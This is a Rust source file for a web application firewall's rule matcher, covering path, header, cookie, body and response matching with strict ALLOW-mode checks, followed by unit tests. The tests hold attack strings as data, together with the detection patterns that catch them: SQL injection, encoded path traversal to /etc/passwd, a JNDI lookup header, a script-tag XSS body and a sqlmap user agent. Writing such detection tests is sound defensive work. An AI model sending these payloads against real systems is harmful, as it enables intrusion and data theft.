use std::borrow::Cow;

use http::Method;
use http::header::HeaderName;
use regex::Regex;

use crate::cidr::IpNet;
use crate::request_view::{RequestView, ResponseView, cookie_pairs};

pub const TARGET_PATH: u8 = 1 << 0;
pub const TARGET_QUERY: u8 = 1 << 1;
pub const TARGET_BODY: u8 = 1 << 2;
pub const TARGET_COOKIES: u8 = 1 << 3;
pub const TARGET_HEADERS: u8 = 1 << 4;
pub const TARGET_RESPONSE_BODY: u8 = 1 << 5;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct StatusRange {
    pub start: u16,
    pub end: u16,
}

impl StatusRange {
    pub fn contains(self, status: u16) -> bool {
        (self.start..=self.end).contains(&status)
    }
}

/// Header values are matched lossily so that a single invalid byte cannot hide
/// an otherwise matching value (RFC 9110 allows obs-text bytes in field values).
fn header_text(value: &http::HeaderValue) -> Cow<'_, str> {
    String::from_utf8_lossy(value.as_bytes())
}

#[derive(Debug, Default)]
pub struct Matcher {
    pub paths: Vec<Regex>,
    pub methods: Option<Vec<Method>>,
    pub source_ips: Option<Vec<IpNet>>,
    pub headers: Vec<(HeaderName, Vec<Regex>)>,
    pub cookies: Vec<(String, Vec<Regex>)>,
    pub statuses: Vec<StatusRange>,
    pub response_headers: Vec<(HeaderName, Vec<Regex>)>,
    pub payload: Option<PayloadMatcher>,
    /// ALLOW rules disable the WAF, so trust has to be unanimous: every
    /// representation of each matched target (all path forms, all values of a
    /// repeated header or cookie, all decoded forms of a payload target) must
    /// agree, so one copy of a marker cannot shadow a `BLOCK` on the copies
    /// the upstream (or the client) really sent.
    pub allow_mode: bool,
}

#[derive(Debug)]
pub struct PayloadMatcher {
    pub regexes: Vec<Regex>,
    pub targets: u8,
}

impl Matcher {
    pub fn matches(&self, view: &RequestView<'_>) -> bool {
        self.matches_request(view) && self.matches_payload(view, None)
    }

    pub fn matches_response(&self, view: &RequestView<'_>, response: &ResponseView<'_>) -> bool {
        if !self.matches_request(view) {
            return false;
        }

        if !self.statuses.is_empty()
            && !self
                .statuses
                .iter()
                .any(|range| range.contains(response.status.as_u16()))
        {
            return false;
        }

        for (name, regexes) in &self.response_headers {
            let matched = if self.allow_mode {
                let values: Vec<_> = response.headers.get_all(name).iter().collect();
                !values.is_empty()
                    && values
                        .iter()
                        .all(|value| regexes.iter().any(|re| re.is_match(&header_text(value))))
            } else {
                response
                    .headers
                    .get_all(name)
                    .iter()
                    .any(|value| regexes.iter().any(|re| re.is_match(&header_text(value))))
            };
            if !matched {
                return false;
            }
        }

        self.matches_payload(view, Some(response))
    }

    fn matches_request(&self, view: &RequestView<'_>) -> bool {
        if !self.paths.is_empty() {
            let matched = if self.allow_mode {
                !view.path_forms.is_empty()
                    && view
                        .path_forms
                        .iter()
                        .all(|form| self.paths.iter().any(|regex| regex.is_match(form)))
            } else {
                view.path_forms
                    .iter()
                    .any(|form| self.paths.iter().any(|regex| regex.is_match(form)))
            };
            if !matched {
                return false;
            }
        }

        if let Some(methods) = &self.methods
            && !methods.contains(view.method)
        {
            return false;
        }

        if let Some(networks) = &self.source_ips
            && !networks
                .iter()
                .any(|network| network.contains(view.source_ip))
        {
            return false;
        }

        for (name, regexes) in &self.headers {
            let matched = if self.allow_mode {
                // One matching copy is not enough; every copy the client sent
                // must agree, or the rule is not the trusted request it asked
                // to allow.
                let values: Vec<_> = view.headers.get_all(name).iter().collect();
                !values.is_empty()
                    && values
                        .iter()
                        .all(|value| regexes.iter().any(|re| re.is_match(&header_text(value))))
            } else {
                view.headers
                    .get_all(name)
                    .iter()
                    .any(|value| regexes.iter().any(|re| re.is_match(&header_text(value))))
            };
            if !matched {
                return false;
            }
        }

        for (name, regexes) in &self.cookies {
            let values: Vec<_> = cookie_pairs(view.headers)
                .into_iter()
                .filter(|(cookie_name, _)| cookie_name.as_ref() == name.as_str())
                .collect();
            let matched = if self.allow_mode {
                !values.is_empty()
                    && values
                        .iter()
                        .all(|(_, value)| regexes.iter().any(|re| re.is_match(value.as_ref())))
            } else {
                values
                    .iter()
                    .any(|(_, value)| regexes.iter().any(|re| re.is_match(value.as_ref())))
            };
            if !matched {
                return false;
            }
        }

        true
    }

    fn matches_payload(&self, view: &RequestView<'_>, response: Option<&ResponseView<'_>>) -> bool {
        let Some(payload) = &self.payload else {
            return true;
        };
        payload.matches(view, response, self.allow_mode)
    }
}

impl PayloadMatcher {
    fn matches(
        &self,
        view: &RequestView<'_>,
        response: Option<&ResponseView<'_>>,
        allow_mode: bool,
    ) -> bool {
        if self.targets & TARGET_PATH != 0 {
            let hit = if allow_mode {
                !view.path_forms.is_empty() && view.path_forms.iter().all(|form| self.hits(form))
            } else {
                view.path_forms.iter().any(|form| self.hits(form))
            };
            if hit {
                return true;
            }
        }

        if self.targets & TARGET_QUERY != 0 {
            let hit = if allow_mode {
                !view.query_forms.is_empty() && view.query_forms.iter().all(|form| self.hits(form))
            } else {
                view.query_forms.iter().any(|form| self.hits(form))
            };
            if hit {
                return true;
            }
        }

        if self.targets & TARGET_BODY != 0 && !view.body_rules_exempt {
            if allow_mode && view.body_truncated {
                // The rest of the body has not been inspected, so an ALLOW
                // rule must not treat the visible prefix as the whole message.
                return false;
            }
            let hit = if allow_mode {
                !view.body.is_empty()
                    && self.hits(&String::from_utf8_lossy(view.body))
                    && view
                        .body_forms
                        .iter()
                        .all(|form| self.hits(&String::from_utf8_lossy(form)))
            } else {
                (!view.body.is_empty() && self.hits(&String::from_utf8_lossy(view.body)))
                    || view
                        .body_forms
                        .iter()
                        .any(|form| self.hits(&String::from_utf8_lossy(form)))
            };
            if hit {
                return true;
            }
        }

        if self.targets & TARGET_COOKIES != 0 {
            let pairs = cookie_pairs(view.headers);
            let hit = if allow_mode {
                !pairs.is_empty() && pairs.iter().all(|(_, value)| self.hits(value.as_ref()))
            } else {
                pairs.iter().any(|(_, value)| self.hits(value.as_ref()))
            };
            if hit {
                return true;
            }
        }

        if self.targets & TARGET_HEADERS != 0 {
            let hit = if allow_mode {
                !view.headers.is_empty()
                    && view
                        .headers
                        .values()
                        .all(|value| self.hits(&header_text(value)))
            } else {
                view.headers
                    .values()
                    .any(|value| self.hits(&header_text(value)))
            };
            if hit {
                return true;
            }
        }

        if self.targets & TARGET_RESPONSE_BODY != 0
            && let Some(response) = response
        {
            if allow_mode && response.body_truncated {
                return false;
            }
            if !response.body.is_empty() && self.hits(&String::from_utf8_lossy(response.body)) {
                return true;
            }
        }

        false
    }

    fn hits(&self, text: &str) -> bool {
        self.regexes.iter().any(|regex| regex.is_match(text))
    }
}

#[cfg(test)]
mod tests {
    use http::{HeaderMap, HeaderValue, Method, StatusCode, Uri, header::COOKIE};

    use super::*;

    fn view<'a>(
        method: &'a Method,
        uri: &'a Uri,
        headers: &'a HeaderMap,
        body: &'a [u8],
    ) -> RequestView<'a> {
        RequestView::new(
            method,
            uri,
            headers,
            body,
            "127.0.0.1".parse().expect("valid IP"),
        )
    }

    fn regex(pattern: &str) -> Regex {
        Regex::new(pattern).expect("valid test regex")
    }

    #[test]
    fn matches_decoded_query() {
        let method = Method::GET;
        let uri: Uri = "/?q=union%20select".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex(r"(?i)union\s+select")],
                targets: TARGET_QUERY,
            }),
            ..Matcher::default()
        };
        assert!(matcher.matches(&view(&method, &uri, &headers, b"")));
    }

    #[test]
    fn matches_decoded_path() {
        let method = Method::GET;
        let uri: Uri = "/files/%2e%2e%2fetc/passwd".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let matcher = Matcher {
            paths: vec![regex(r"\.\./")],
            ..Matcher::default()
        };
        assert!(matcher.matches(&view(&method, &uri, &headers, b"")));
    }

    #[test]
    fn all_header_conditions_must_match() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let mut headers = HeaderMap::new();
        headers.insert("user-agent", HeaderValue::from_static("sqlmap/1.0"));
        let matcher = Matcher {
            headers: vec![
                (HeaderName::from_static("user-agent"), vec![regex("sqlmap")]),
                (HeaderName::from_static("x-api-key"), vec![regex(".+")]),
            ],
            ..Matcher::default()
        };
        assert!(!matcher.matches(&view(&method, &uri, &headers, b"")));
    }

    #[test]
    fn allow_mode_header_condition_requires_every_value() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let matcher = Matcher {
            headers: vec![(
                HeaderName::from_static("x-marker"),
                vec![regex("^tokenfree$")],
            )],
            allow_mode: true,
            ..Matcher::default()
        };

        // A repeated header must agree on every copy, so a forged extra value
        // cannot shadow later rules for the trusted request.
        let mut shadowed = HeaderMap::new();
        shadowed.append("x-marker", HeaderValue::from_static("tokenfree"));
        shadowed.append("x-marker", HeaderValue::from_static("bogus"));
        assert!(!matcher.matches(&view(&method, &uri, &shadowed, b"")));

        let mut reversed = HeaderMap::new();
        reversed.append("x-marker", HeaderValue::from_static("bogus"));
        reversed.append("x-marker", HeaderValue::from_static("tokenfree"));
        assert!(!matcher.matches(&view(&method, &uri, &reversed, b"")));

        let mut trusted = HeaderMap::new();
        trusted.insert("x-marker", HeaderValue::from_static("tokenfree"));
        assert!(matcher.matches(&view(&method, &uri, &trusted, b"")));

        let missing = HeaderMap::new();
        assert!(!matcher.matches(&view(&method, &uri, &missing, b"")));
    }

    #[test]
    fn block_mode_header_condition_still_matches_any_value() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let matcher = Matcher {
            headers: vec![(
                HeaderName::from_static("x-marker"),
                vec![regex("tokenfree")],
            )],
            ..Matcher::default()
        };

        let mut headers = HeaderMap::new();
        headers.append("x-marker", HeaderValue::from_static("tokenfree"));
        headers.append("x-marker", HeaderValue::from_static("bogus"));
        assert!(matcher.matches(&view(&method, &uri, &headers, b"")));
    }

    #[test]
    fn allow_mode_body_requires_a_complete_body() {
        let method = Method::POST;
        let uri: Uri = "/".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex("^trusted$")],
                targets: TARGET_BODY,
            }),
            allow_mode: true,
            ..Matcher::default()
        };

        assert!(matcher.matches(&view(&method, &uri, &headers, b"trusted")));
        assert!(
            !matcher.matches(&view(&method, &uri, &headers, b"trusted").with_body_truncated(true))
        );

        let block = Matcher {
            allow_mode: false,
            ..matcher
        };
        assert!(
            block.matches(&view(&method, &uri, &headers, b"trusted").with_body_truncated(true))
        );
    }

    #[test]
    fn exempt_body_is_skipped_for_blocks_and_never_trusted_by_allows() {
        let method = Method::POST;
        let uri: Uri = "/editor".parse().expect("valid URI");
        let headers = HeaderMap::new();

        let block = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex("payload")],
                targets: TARGET_BODY,
            }),
            ..Matcher::default()
        };
        let exempt = view(&method, &uri, &headers, b"payload").with_body_rules_exempt(true);
        assert!(!block.matches(&exempt));
        assert!(block.matches(&view(&method, &uri, &headers, b"payload")));

        let mixed = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex("payload")],
                targets: TARGET_BODY | TARGET_QUERY,
            }),
            ..Matcher::default()
        };
        let query_uri: Uri = "/editor?q=payload".parse().expect("valid URI");
        let exempt_query =
            view(&method, &query_uri, &headers, b"payload").with_body_rules_exempt(true);
        assert!(mixed.matches(&exempt_query));

        // A body-only ALLOW rule cannot match when the body was skipped, while
        // the same rule still matches an inspected body.
        let allow = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex("payload")],
                targets: TARGET_BODY,
            }),
            allow_mode: true,
            ..Matcher::default()
        };
        assert!(!allow.matches(&exempt));
        assert!(allow.matches(&view(&method, &uri, &headers, b"payload")));
    }

    #[test]
    fn allow_mode_response_body_requires_a_complete_body() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex("secret")],
                targets: TARGET_RESPONSE_BODY,
            }),
            allow_mode: true,
            ..Matcher::default()
        };
        let request = view(&method, &uri, &headers, b"");

        let complete = ResponseView::new(StatusCode::OK, &headers, b"secret", false);
        assert!(matcher.matches_response(&request, &complete));

        let truncated = ResponseView::new(StatusCode::OK, &headers, b"secret", true);
        assert!(!matcher.matches_response(&request, &truncated));
    }

    #[test]
    fn allow_mode_cookie_condition_requires_every_pair() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let matcher = Matcher {
            cookies: vec![("session".to_owned(), vec![regex("^admin$")])],
            allow_mode: true,
            ..Matcher::default()
        };

        let mut shadowed = HeaderMap::new();
        shadowed.insert(
            COOKIE,
            HeaderValue::from_static("session=admin; session=guest"),
        );
        assert!(!matcher.matches(&view(&method, &uri, &shadowed, b"")));

        let mut trusted = HeaderMap::new();
        trusted.insert(
            COOKIE,
            HeaderValue::from_static("session=admin; theme=dark"),
        );
        assert!(matcher.matches(&view(&method, &uri, &trusted, b"")));
    }

    #[test]
    fn allow_mode_query_payload_requires_forms_to_agree() {
        let method = Method::GET;
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex(r"^q=tokenfree$")],
                targets: TARGET_QUERY,
            }),
            allow_mode: true,
            ..Matcher::default()
        };

        let exclusive: Uri = "/?q=tokenfree".parse().expect("valid URI");
        assert!(matcher.matches(&view(&method, &exclusive, &HeaderMap::new(), b"")));

        for appended in ["/?q=tokenfree&z=1", "/?a=zz&q=tokenfree"] {
            let uri: Uri = appended.parse().expect("valid URI");
            assert!(
                !matcher.matches(&view(&method, &uri, &HeaderMap::new(), b"")),
                "appended marker must not allow {appended}"
            );
        }
    }

    #[test]
    fn block_mode_query_payload_still_matches_anywhere() {
        let method = Method::GET;
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex("tokenfree")],
                targets: TARGET_QUERY,
            }),
            ..Matcher::default()
        };

        let uri: Uri = "/?a=zz&q=tokenfree".parse().expect("valid URI");
        assert!(matcher.matches(&view(&method, &uri, &HeaderMap::new(), b"")));
    }

    #[test]
    fn non_utf8_header_values_are_still_matched() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let mut headers = HeaderMap::new();
        headers.insert(
            "user-agent",
            HeaderValue::from_bytes(b"sqlmap/1.0\xff").expect("valid header bytes"),
        );
        let matcher = Matcher {
            headers: vec![(HeaderName::from_static("user-agent"), vec![regex("sqlmap")])],
            ..Matcher::default()
        };
        assert!(matcher.matches(&view(&method, &uri, &headers, b"")));
    }

    #[test]
    fn non_utf8_headers_are_scanned_by_payload_targets() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let mut headers = HeaderMap::new();
        headers.insert(
            "x-api",
            HeaderValue::from_bytes(b"${jndi:ldap://x/a}\xff").expect("valid header bytes"),
        );
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex(r"\$\{jndi:")],
                targets: TARGET_HEADERS,
            }),
            ..Matcher::default()
        };
        assert!(matcher.matches(&view(&method, &uri, &headers, b"")));
    }

    #[test]
    fn method_filter_rejects_other_methods() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let matcher = Matcher {
            methods: Some(vec![Method::POST]),
            ..Matcher::default()
        };
        assert!(!matcher.matches(&view(&method, &uri, &headers, b"")));
    }

    #[test]
    fn source_ip_cidr_is_respected() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let matcher = Matcher {
            source_ips: Some(vec!["10.0.0.0/8".parse().expect("valid CIDR")]),
            ..Matcher::default()
        };
        assert!(!matcher.matches(&view(&method, &uri, &headers, b"")));
    }

    #[test]
    fn body_pattern_matches_raw_bytes() {
        let method = Method::POST;
        let uri: Uri = "/submit".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex(r"(?i)<script")],
                targets: TARGET_BODY,
            }),
            ..Matcher::default()
        };
        assert!(matcher.matches(&view(
            &method,
            &uri,
            &headers,
            b"x=<script>alert(1)</script>"
        )));
    }

    #[test]
    fn body_pattern_matches_decoded_form_body() {
        let method = Method::POST;
        let uri: Uri = "/submit".parse().expect("valid URI");
        let mut headers = HeaderMap::new();
        headers.insert(
            http::header::CONTENT_TYPE,
            HeaderValue::from_static("application/x-www-form-urlencoded"),
        );
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex(r"(?i)union/select")],
                targets: TARGET_BODY,
            }),
            ..Matcher::default()
        };
        assert!(matcher.matches(&view(&method, &uri, &headers, b"q=%27+union%2Fselect")));
    }

    #[test]
    fn double_encoded_query_is_matched() {
        let method = Method::GET;
        let uri: Uri = "/?q=union%2520select".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex(r"(?i)union\s+select")],
                targets: TARGET_QUERY,
            }),
            ..Matcher::default()
        };
        assert!(matcher.matches(&view(&method, &uri, &headers, b"")));
    }

    #[test]
    fn double_encoded_path_is_matched() {
        let method = Method::GET;
        let uri: Uri = "/files/%252e%252e%252fetc/passwd"
            .parse()
            .expect("valid URI");
        let headers = HeaderMap::new();
        let matcher = Matcher {
            paths: vec![regex(r"\.\./")],
            ..Matcher::default()
        };
        assert!(matcher.matches(&view(&method, &uri, &headers, b"")));
    }

    #[test]
    fn multipart_filename_is_scanned_by_body_targets() {
        let method = Method::POST;
        let uri: Uri = "/upload".parse().expect("valid URI");
        let mut headers = HeaderMap::new();
        headers.insert(
            http::header::CONTENT_TYPE,
            HeaderValue::from_static("multipart/form-data; boundary=X"),
        );
        let body = b"--X\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../etc/passwd\"\r\n\r\nblob\r\n--X--\r\n";
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex(r"(?i)\.\./")],
                targets: TARGET_BODY,
            }),
            ..Matcher::default()
        };
        assert!(matcher.matches(&view(&method, &uri, &headers, body)));
    }

    #[test]
    fn response_status_range_is_matched() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let response_headers = HeaderMap::new();
        let matcher = Matcher {
            statuses: vec![StatusRange {
                start: 500,
                end: 599,
            }],
            ..Matcher::default()
        };
        let request = view(&method, &uri, &headers, b"");
        let response = ResponseView::new(StatusCode::BAD_GATEWAY, &response_headers, b"", false);
        assert!(matcher.matches_response(&request, &response));

        let response = ResponseView::new(StatusCode::OK, &response_headers, b"", false);
        assert!(!matcher.matches_response(&request, &response));
    }

    #[test]
    fn response_header_condition_is_matched() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let mut response_headers = HeaderMap::new();
        response_headers.insert("server", HeaderValue::from_static("Apache/2.4.1"));
        let matcher = Matcher {
            response_headers: vec![(
                HeaderName::from_static("server"),
                vec![regex(r"(?i)apache")],
            )],
            ..Matcher::default()
        };
        let request = view(&method, &uri, &headers, b"");
        let response = ResponseView::new(StatusCode::OK, &response_headers, b"", false);
        assert!(matcher.matches_response(&request, &response));
    }

    #[test]
    fn response_body_target_scans_response_body() {
        let method = Method::GET;
        let uri: Uri = "/".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let response_headers = HeaderMap::new();
        let matcher = Matcher {
            payload: Some(PayloadMatcher {
                regexes: vec![regex(r"(?i)segmentation fault")],
                targets: TARGET_RESPONSE_BODY,
            }),
            ..Matcher::default()
        };
        let request = view(&method, &uri, &headers, b"segmentation fault");
        let response = ResponseView::new(StatusCode::OK, &response_headers, b"all good", false);
        assert!(!matcher.matches_response(&request, &response));

        let response = ResponseView::new(
            StatusCode::OK,
            &response_headers,
            b"warning: Segmentation fault",
            false,
        );
        assert!(matcher.matches_response(&request, &response));
    }

    #[test]
    fn response_matcher_still_applies_request_conditions() {
        let method = Method::GET;
        let uri: Uri = "/admin".parse().expect("valid URI");
        let headers = HeaderMap::new();
        let response_headers = HeaderMap::new();
        let matcher = Matcher {
            paths: vec![regex("^/admin")],
            payload: Some(PayloadMatcher {
                regexes: vec![regex("leak")],
                targets: TARGET_RESPONSE_BODY,
            }),
            ..Matcher::default()
        };
        let request = view(&method, &uri, &headers, b"");
        let response = ResponseView::new(StatusCode::OK, &response_headers, b"leak", false);
        assert!(matcher.matches_response(&request, &response));

        let uri: Uri = "/public".parse().expect("valid URI");
        let request = view(&method, &uri, &headers, b"");
        assert!(!matcher.matches_response(&request, &response));
    }
}
